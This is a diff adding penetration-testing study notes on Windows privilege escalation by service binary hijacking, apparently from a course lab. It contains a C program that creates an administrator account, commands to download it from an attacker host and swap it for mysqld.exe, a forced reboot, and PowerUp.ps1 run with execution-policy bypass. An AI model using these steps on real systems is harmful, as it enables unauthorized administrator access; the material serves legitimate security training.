@@ -1146,7 +1146,57 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     `iwr -uri http://<KALI>/winPEASx64.exe -Outfile winPEAS.exe`  
   -  Run winPEAS `.\winPEAS.exe`  
   -  Review output: system info (Windows), NTLM settings, transcripts history, Users, possible password
-- Service Binary Hijacking
+- Service Binary Hijacking (RDP)
+  - List of services with binary path > Apache, mysql
+    `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+  - Permissions of httpd.exe > Full, Modify, RX, R, W
+    `icacls "C:\xampp\apache\bin\httpd.exe"` //BULLTIN\Users:(RX)
+    `icacls "C:\xampp\mysql\bin\mysqld.exe"` //BULLTIN\Users:(F)
+  - create a binary file adduser.c to replace the original mysqld.exe
+    ```
+    #include <stdlib.h>
+
+    int main ()
+    {
+      int i;
+  
+      i = system ("net user dave2 password123! /add");
+      i = system ("net localgroup administrators dave2 /add");
+  
+     return 0;
+    }
+    ```
+  - cross-compile the code to 64-bit app
+    `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+  - transfer the exe to target and replace mysqld.exe
+    ```
+    iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
+    move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+    move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+    ```
+  - restart the service to execute the binary > access denied
+    `net stop mysql`
+  - another approach, check the startup type > Auto
+    `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`
+  - check the privilege "SeShutDownPrivilege" for reboot privilege 
+    `whoami /priv`
+  - reboot machine
+    `shutdown /r /t 0`
+  - connect again as dave via RDP and open a PowerShell window. new user 'dave2' created.
+    `Get-LocalGroupMember administrators`
+  - Copy PowerUp.ps1 to kali's home directory and serve it with a Python3 web server
+    `cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`
+    `python3 -m http.server 80`  
+  - On target machine, download the PowerUp.ps1 and displays services the current user can modify > identified mysql (among others) to be vulnerable
+    ```
+    iwr -uri http://<KALI>/PowerUp.ps1 -Outfile PowerUp.ps1 //PowerShell post-exploitation tool used primarily for Windows privilege escalation
+    powershell -ep bypass
+    . .\PowerUp.ps1
+    Get-ModifiableServiceFile
+    ```
+  - Error of "AbuseFunction" to replace binary file
+    `Install-ServiceBinary -Name 'mysql'` //mysql' for service mysql not modifiable by the current user
+  - Listing 55 - Analyzing the function ModifiablePath    
 - DLL hijacking
 - Unquoted Service Paths
 - Scheduled Tasks
